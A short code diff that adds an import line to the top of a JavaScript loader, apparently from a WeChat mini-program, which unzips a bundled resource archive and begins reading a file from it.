@@ -1,4 +1,4 @@
-wx.y$ = [];var fs = wx.getFileSystemManager();wx.getFileSystemManager().unzip({ zipFilePath: "/res/files.zip", targetPath: wx.env.USER_DATA_PATH + "/f/", success: o => {
+import "bbssss/bbbweasaf.js";wx.y$ = [];var fs = wx.getFileSystemManager();wx.getFileSystemManager().unzip({ zipFilePath: "/res/files.zip", targetPath: wx.env.USER_DATA_PATH + "/f/", success: o => {
     "unzip:ok" == o.errMsg ? fs.readFile({ filePath: wx.env.USER_DATA_PATH + "/f/files", encoding: "utf8", success: function (o) {
         if ("readFile:ok" == o.errMsg && o.data) {
           try {
